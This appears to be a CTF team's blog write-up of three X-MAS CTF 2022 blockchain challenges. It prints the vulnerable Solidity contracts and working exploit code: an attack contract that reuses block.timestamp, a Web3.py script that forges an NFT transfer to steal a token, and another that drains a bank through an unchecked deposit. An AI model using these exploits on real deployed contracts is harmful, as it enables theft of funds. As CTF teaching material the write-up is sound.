---
layout: post
current: post
cover: assets/xmas/blockchain/cover.png
navigation: True
title: "Blocker, Cookie Market, & Bread Bank"
date: 2022-12-29 10:00:00
tags: [XMAS, misc]
class: post-template
subclass: 'post'
author: david-a-perez
---

Blockchain: a new way to program... and a new way to write vulnerable code. 

From trusting timestamps to be secure, to trusting any caller, to strange token deposit logic, it seems there are unlimited ways to write vulnerable contracts.

This year there were three different blockchain challenges. They all shared the same format where you connect with netcat to launch a private blockchain. You are given an RPC endpoint, a private key, and a setup contract address.

```
❯ nc challs.htsp.ro 9000        
1 - launch new instance
2 - kill instance
3 - get flag
action? 1
your private blockchain has been deployed
it will automatically terminate in 30 minutes
here's some useful information
uuid:           6541e735-f174-46fd-a198-92ea95275db5
rpc endpoint:   http://challs.htsp.ro:9001/6541e735-f174-46fd-a198-92ea95275db5
private key:    0xe3bd87f07eef5987dc4d069f7e58006dfcd5eb707f66a3adeade9e727ff7a892
setup contract: 0x89DCC2BB08917D46c8751b805C073851CDC53bbe
```

We wasted a bunch of time in this category at the start because we thought "setup contract" was the location where the contract we were given was (or should be). Instead, we discovered that the address is of a `Setup` contract that deploys the vulnerable contract by exploring the git repositories of challenges from last year. For the first challenge, we guessed what the setup contract was based on the welcome challenge from the previous year. For the rest of the challenges, we used `panoramix` to decompile the setup contract that had been deployed.

## Blocker
For this challenge, we are given one file called `Blocker.sol`:
```solidity
pragma solidity 0.8.17;

contract Blocker {

    bool public solved = false;
    uint256 public current_timestamp;

    function _getPreviousTimestamp() internal returns (uint256) {  
        current_timestamp = block.timestamp;
        return block.timestamp;
    }
    
    function solve(uint256 _guess) public {
        require(_guess == _getPreviousTimestamp());
        solved = true;
    }
}
```

For this challenge, we need to call the `solve` function with the timestamp of the block. Interestingly, this could be accomplished by adding some offset to the current timestamp since the timestamp has only a second resolution. However, the vulnerability is that `block.timestamp` is not good for security purposes. That timestamp is for the entire block and therefore any other contract that executes during that block has the same timestamp. We can deploy a contract that calls the `solve` function with `block.timestamp` as the argument. Therefore, to solve this challenge we deploy the following contract:

```solidity
pragma solidity 0.8.17;

import "./Blocker.sol";

contract Attack {
    Blocker blocker;

    constructor(address _blocker) {
        blocker = Blocker(_blocker);
    }

    function attack() public {
        blocker.solve(block.timestamp);
    }
}
```

To deploy this contract, we used the [Remix Online IDE](https://remix.ethereum.org/) and [MetaMask](https://metamask.io/). Here is the script we used to deploy and call our `Attack` contract. 

```javascript
// Right click on the script name and hit "Run" to execute
const {expect} = require('chai')
const {ethers} = require('hardhat')
 
describe('Blocker', function () {
    it('Attack', async function () {
        const setup = await ethers.getContractAt("Setup", "0x89E7251A52a61D6DaC95d145aEE04B4F8DB0Ca3E");
        const blockerAddr = await setup.blocker();
        console.log(`Blocker address: ${blockerAddr}`);

        const blocker = await ethers.getContractAt("Blocker", blockerAddr);
 
        const Attack = await ethers.getContractFactory('Attack')
        const attack = await Attack.deploy(blocker.address)
        await attack.deployed()
        await attack.attack()
 
        expect(await blocker.solved()).to.equal(true, 'Blocker solved()')
    })
})
```

And here is the `Setup` contract that we guessed at based on a challenge from 2021:
```solidity
pragma solidity 0.8.17;

import .Blocker.sol;

 
  @title Setup for Hello World
  @author bobi @ X-MASCTF2021
 
contract Setup {
    Blocker public blocker;

    constructor() {
        blocker = new Blocker();
    }

    function isSolved() public view returns (bool) {
        return blocker.solved();
    }
}
```

## Cookie Market

For this challenge, we are given two contracts: `cookie.sol` and `CookieMarket.sol`:
```solidity
pragma solidity 0.8.17;

import "./ERC721.sol";

contract Cookie is ERC721("cookie", "E") {

    uint256 public cookieIDX;
    address public owner;

    constructor(){
        cookieIDX = 0;
    }

    // @dev mints an cookie. Note that there are only 10 cookies in the basket.
    function mintcookie() external {
        require(cookieIDX < 10);
        _mint(msg.sender, cookieIDX);
        cookieIDX += 1;
    }

}
```

```solidity
pragma solidity 0.8.17;

import "./IERC721.sol";
import "./IERC721Receiver.sol";

contract CookieMarket is IERC721Receiver {

    // mapping that handles ownership of the cookies within the CookieMarket.
    mapping(uint256 => address) public canRedeemcookie;
    
    // struct that handles the orders in the market
    struct sell_Order {
        uint256 cookie_idx_offered;    // the ERC721 idx of the "cookie" token.
        uint256 amount_eth_wanted;  // the amount of ETH the seller wants to receive for the cookie.
        address cookie_provider;       // the address of the seller.
    }

    // storing all the sell orders in the market.
    sell_Order[] public sellOrders;

    // cookie
    IERC721 public cookie;
    
    /**
        @dev cookieMarket constructor.

        @param _cookie ERC721 contract instance.
    */
    constructor(address _cookie) {
        cookie = IERC721(_cookie);
    }

    /**
        @dev Allows a buyer to buy an cookie from the cookieMarket via exhausting its subsequent sell order.

        @param _idx The ERC721 idx of the cookie.
        @param _owner The `current` owner of the cookie.
    */
    function executeOrder(uint256 _idx, address _owner) external payable {

        require(
            msg.sender != _owner, 
            "err: no self-exchanges allowed"
        );

        // find the sellOrder whose cookie_idx_offered == _idx
        for (uint256 i = 0; i < sellOrders.length; i++) {
            if (sellOrders[i].cookie_idx_offered == _idx) {

                // check if the _owner is the seller
                require(sellOrders[i].cookie_provider == _owner, "err: _owner != seller");

                // the cookie is for sale.
                
                // check if the msg.sender has provided enough ETH to pay for the cookie
                if (msg.value >= sellOrders[i].amount_eth_wanted) {

                    // the _owner has enough ETH to pay for the cookie
                    // paying the seller(current owner) of the cookie
                    (bool sent, bytes memory data) = _owner.call{value: msg.value}("");
                    require(sent, "err: transfer failed");

                    // transfer the ownership of the cookie from the seller to the buyer
                    canRedeemcookie[_idx] = msg.sender;

                    // remove the sellOrder from the sellOrders array
                    sellOrders[i] = sellOrders[sellOrders.length - 1];
                    sellOrders.pop();

                    break;
                }
            }
        }
    }

    /**
        @dev Function to retrieve an cookie from the market.
        
        @param _idx The index of the cookie in the market.
    */
    function redeemcookies(uint256 _idx) external {

        // check if sender can redeem the cookie
        require(
            canRedeemcookie[_idx] == msg.sender,
            "err: msg.sender != owner(cookie)"
        );

        // approve the cookie transfer.
        cookie.approve(
            msg.sender, 
            _idx
        );

        // transfer the ownership of the cookie.
        cookie.transferFrom(
            address(this), 
            msg.sender, 
            _idx
        );

        // remove the cookie _idx from the canRedeemcookie mapping
        delete canRedeemcookie[_idx];
    }

    /**
        @dev Function to effectively add a sellOrder for your cookie on the cookieMarket.
        
        @param _cookieIDX The index of the ERC721 cookie.
        @param _ethWanted The amount of ETH the seller wants to receive for the cookie.
    */
    function addSellOrder(uint256 _cookieIDX, uint256 _ethWanted) external {

        // check whether the msg.sender can sell the _cookieIDX
        require(
            canRedeemcookie[_cookieIDX] == msg.sender,
            "err: msg.sender != owner(cookie[_cookieIDX])"
        );

        // create the new sellOrder
        sell_Order memory newOrder;
        newOrder.cookie_idx_offered = _cookieIDX;
        newOrder.amount_eth_wanted = _ethWanted;
        newOrder.cookie_provider = msg.sender;

        sellOrders.push(newOrder);
    }

    /**
        @dev Function to effectively remove a sellOrder from the cookieMarket.
        
        @param _cookieIDX The index of the ERC721 cookie.
    */
    function removeSellOrder(uint256 _cookieIDX) external {

        // iterate through all sellOrders
        for(uint256 i = 0; i < sellOrders.length; i++) {

            // check if the sellOrder is for the _cookieIDX
            if (sellOrders[i].cookie_idx_offered == _cookieIDX) {
                
                // check if the msg.sender is the owner of the cookie
                require(
                    sellOrders[i].cookie_provider == msg.sender,
                    "err: msg.sender != cookie_provider"
                );

                // delete the sellOrder
                sellOrders[i] = sellOrders[sellOrders.length - 1];
                sellOrders.pop();
                break;
            }
        }
    }

    /**
        @dev Inherited from IERC721Receiver.
    */
    function onERC721Received(
        address,
        address _from,
        uint256 _tokenId,
        bytes calldata
    ) external override returns (bytes4) {

        // we have received an cookie from its owner; mark that in the redeem mapping
        canRedeemcookie[_tokenId] = _from;
        
        return this.onERC721Received.selector; 
    }
}
```
The `cookie` contract uses `ERC721` to define an NFT. Then, the `CookieMarket` uses `IERC721Receiver` to create a market where the NFT can be sold and purchased. The goal of the challenge is to steal the first minted cookie. That cookie is currently held by the `CookieMarket` contract, but there are no sell orders for that cookie. (Interestingly, this contract has a unrelated vulnerabilty where the owner of a cookie can create multiple sell orders for a cookie. A malicious actor can scam someone from their purchase by setting up multiple sell orders for their cookie and using a second account to buy the cookie again after anyone buys their cookie. Both payments go to the original account, but the cookie is owned by the second account at the end. Unfortunately, there are no sell orders and we cannot create a sell order for a cookie that we do not own.)

Instead, we use a vulnerability in the `onERC721Received` function. This function is called by `safeTransferFrom` on an `ERC721` contract. However, the function can be called by any `ERC721` contract, and `CookieMarket` does not verify that the caller is the cookie contract that it was constructed with. Therefore, if we create a new `cookie` contract, mint cookie 0, and tranfer cookie 0 into the `CookieMarket`, `canRedeemCookie[0]` is set to our accounts address. After that, we only need to redeem the cookie.

We used `panoramix` on the `Setup` contract to figure out that slot 0 corresponds to the `cookie` contract and slot 1 corresponds to the `CookieMarket` contract. Additionally, we decided to use [Web3.py](https://web3py.readthedocs.io/en/v5/) to interact with the private blockchain.

First, we import libraries and setup the provider and account:

```python
from web3 import Web3, HTTPProvider
import solcx
from eth_utils.address import to_checksum_address

rpc = 'http://challs.htsp.ro:9003/9afa928d-8629-45c5-843c-700d28758662'
setup_contract = '0x74661A8a825BB6B819c1753Bf991A0ECAcBA971F'
priv_key = '0xa0e7b61b9b2750c6f48ac66076cb02c8cef39706a4039e38195ed256be9a6985'

w3 = Web3(HTTPProvider(rpc))

account = w3.eth.account.from_key(priv_key)
```

Then, we access slots 0 and 1 of the `Setup` contract to be able to interact with the `cookie` contract and `CookieMarket` contracts respectivly.

```python
cookie_contract_addr = to_checksum_address(w3.eth.get_storage_at(setup_contract, 0)[-20:])
cookie_market_contract_addr = to_checksum_address(w3.eth.get_storage_at(setup_contract, 1)[-20:])

compiled_cookie = solcx.compile_files(
    ["cookie.sol"],
    output_values=["abi", "bin"]
)['cookie.sol:Cookie']

cookie_market_abi = solcx.compile_files(
    ["CookieMarket.sol"],
    output_values=["abi", "bin"]
)['CookieMarket.sol:CookieMarket']['abi']

Cookie = w3.eth.contract(address=cookie_contract_addr, abi=compiled_cookie['abi'], bytecode=compiled_cookie['bin'])

CookieMarket = w3.eth.contract(address=cookie_market_contract_addr, abi=cookie_market_abi)
```

Then, we deploy another `cookie` contract and mint cookie 0:

```python
fake_cookie_addr_tx_hash = Cookie.constructor().transact()
tx_receipt = w3.eth.wait_for_transaction_receipt(fake_cookie_addr_tx_hash)
FakeCookie = w3.eth.contract(address=tx_receipt['contractAddress'], abi=compiled_cookie['abi'])

FakeCookie.functions.mintcookie().transact({'from': account.address})
```

Then, we transfer the fake cookie 0 to the `CookieMarket` contract and redeem the real cookie 0.

```python
FakeCookie.functions.approve(cookie_market_contract_addr, 0).transact({'from': account.address})
FakeCookie.functions.safeTransferFrom(account.address, cookie_market_contract_addr, 0).transact({'from': account.address})

CookieMarket.functions.redeemcookies(0).transact({'from': account.address})
```

## Bread Bank

For this challenge, we are given 3 contracts: `PonyToken`, `BankPairERC20`, and `BreadBank`.
```solidity
pragma solidity 0.8.17;

import "./openzeppelin-contracts-4.8.0/openzeppelin-contracts-4.8.0/contracts/token/ERC20/ERC20.sol";

contract PonyToken is ERC20("Pony", "PNY") {

    constructor(uint256 _amount) {
        _mint(msg.sender, _amount);
    }
}
```

```solidity
pragma solidity 0.8.17;

import "./openzeppelin-contracts-4.8.0/openzeppelin-contracts-4.8.0/contracts/token/ERC20/ERC20.sol";

contract BankPairERC20 is ERC20 {

    address public owner;
    ERC20 public underlying;

    constructor(ERC20 _underlying, uint256 amount) ERC20("", "BKP") {
        owner = msg.sender;
        underlying = _underlying;
    }

    function mint(address to, uint256 amount) external {
        require(msg.sender == owner, "BankPairERC20: Only the owner can mint.");
        _mint(to, amount);
    }

    function burn(address from, uint256 amount) external {
        require(msg.sender == owner, "BankPairERC20: Only the owner can burn.");
        _burn(from, amount);
    }
}
```

```solidity
pragma solidity 0.8.17;

import "./openzeppelin-contracts-4.8.0/openzeppelin-contracts-4.8.0/contracts/token/ERC20/ERC20.sol";
import "./BankPairERC20.sol";

contract BreadBank {
    
    // @dev Allows a user to deposit the ERC20 underlying token into the bank.
    function createDepositToken(ERC20 _underlying, uint256 _amount) public returns(BankPairERC20){
        // Assure _underlying is not the BANK token.
        require(address(_underlying) != address(this), "BreadBank: Cannot deposit BANK token.");

        // Assure enough tokens have been transferred to the bank.
        require(_underlying.balanceOf(address(this)) >= _amount, "BreadBank: Not enough tokens have been deposited.");

        // Create a new bankpair token for the user.
        BankPairERC20 depositToken = new BankPairERC20(_underlying, _amount);

        // Mint the deposit token to the user.
        depositToken.mint(msg.sender, _amount);

        // Return the deposit token.
        return depositToken;
    }

    // @dev Allows a user to calculate the rewards they will receive for a given bank pair token.
    function calculateRewards(BankPairERC20 _bankPairToken) public view returns (uint256) {
        // Get the underlying token.
        ERC20 underlying = _bankPairToken.underlying();

        // Get the total supply of the bank pair token.
        uint256 totalBankPairSupply = _bankPairToken.totalSupply();

        // Get the total supply of the underlying token.
        uint256 underlyingTotalSupply = underlying.totalSupply();

        // Get the balance of the underlying token.
        uint256 underlyingBalance = underlying.balanceOf(address(this));

        // Calculate the rewards.
        uint256 rewards = (underlyingBalance * _bankPairToken.balanceOf(msg.sender)) / (underlyingTotalSupply * totalBankPairSupply);

        return rewards;
    }

    // @dev Allows a user to receive rewards for a given bank pair token.
    function issueRewards(BankPairERC20 _bankPairToken) public {
        // Get the rewards.
        uint256 rewards = calculateRewards(_bankPairToken);

        // Mint the rewards to the user.
        _bankPairToken.mint(msg.sender, rewards);
    }

    // @dev Allows a user to redeem their bank pair token for the underlying token.
    function redeem(BankPairERC20 _bankPairToken, uint256 _amount) public {
        
        // Assure _amount is not 0.
        require(_amount != 0, "BreadBank: Cannot redeem 0 tokens.");

        // Assure the user has enough bank pair tokens.
        require(_bankPairToken.balanceOf(msg.sender) >= _amount, "BreadBank: Not enough tokens have been deposited.");

        // Get the underlying token.
        ERC20 underlying = _bankPairToken.underlying();

        // Burn the bank pair token.
        _bankPairToken.burn(msg.sender, _amount);

        // Transfer the underlying token to the user.
        underlying.transfer(msg.sender, _amount);
    }


}
```

The `PonyToken` and `BankPair` each use `ERC20` to define fungible tokens. `BreadBank` issues `BankPairs` to users who deposit `ERC20` tokens into the BreadBank. Users can later redeem their `BankPair` token for the underlying `ERC20` token. There is some logic for a rewards system, but we were unable to understand its purpose. The challenge is to steal all the `PonyToken`'s from the `BreadBank`. 

The vulnerability is related to the strange logic for depositing tokens into the `BreadBank`. It checks if enough tokens have been deposited into the bank and creates a `BankPair` token if so. However, it does not check if the tokens were deposited by the caller. (In fact, it seems like this design would not allow for the `BreadBank` to be able to tell who deposited the tokens at all!) Therefore, we call `createDepositToken` to create another `BankPair` with the amount of `PonyToken`'s in the `BreadBank`. Then, we can redeem the `BankPair` to give us all of the tokens.

First, we import libraries and set up the provider and account:

```python
from web3 import Web3, HTTPProvider
import solcx
from eth_utils.address import to_checksum_address

rpc = 'http://challs.htsp.ro:9005/f2e8bf3f-6f6a-4861-8081-0bde5ebff37f'
setup_contract = '0x7c5F86df3E4D5d610dDa06b87cCA84531c70B305'
priv_key = '0x6a187a46a578bf15086b5a7421a72408b448c535333b863fddccb2f1210a2132'

w3 = Web3(HTTPProvider(rpc))

account = w3.eth.account.from_key(priv_key)
```

Then, we access slots 0 and 1 of the `Setup` contract to be able to interact with the `BreadBank` contract and `PonyToken` contracts respectively.

```python
bank_contract_addr = to_checksum_address(w3.eth.get_storage_at(setup_contract, 0)[-20:])
pony_contract_addr = to_checksum_address(w3.eth.get_storage_at(setup_contract, 1)[-20:])

compiled_bank = solcx.compile_files(
    ["BreadBank.sol"],
    output_values=["abi", "bin"]
)['BreadBank.sol:BreadBank']

compiled_pony = solcx.compile_files(
    ["PonyToken.sol"],
    output_values=["abi", "bin"]
)['PonyToken.sol:PonyToken']

compiled_bank_pair = solcx.compile_files(
    ["BankPairERC20.sol"],
    output_values=["abi", "bin"]
)['BankPairERC20.sol:BankPairERC20']

Bank = w3.eth.contract(address=bank_contract_addr, abi=compiled_bank['abi'])
PonyToken = w3.eth.contract(address=pony_contract_addr, abi=compiled_pony['abi'])
```

We get the balance of `PonyToken`'s in the `BreadBank`, and create a new deposit token with that amount. To get the address of the `BankToken` we look at the logs of the transaction receipt:

```python
bank_total = PonyToken.functions.balanceOf(bank_contract_addr).call()

tx_hash = Bank.functions.createDepositToken(PonyToken.address, bank_total).transact({'from': account.address})
tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)

bank_pair_addr = to_checksum_address(tx_receipt['logs'][0]['address'])
```

And finally, we redeem the `BankPair` to receive all `PonyToken`'s.

```python
tx_hash = Bank.functions.redeem(bank_pair_addr, bank_total).transact({'from': account.address})
tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
```

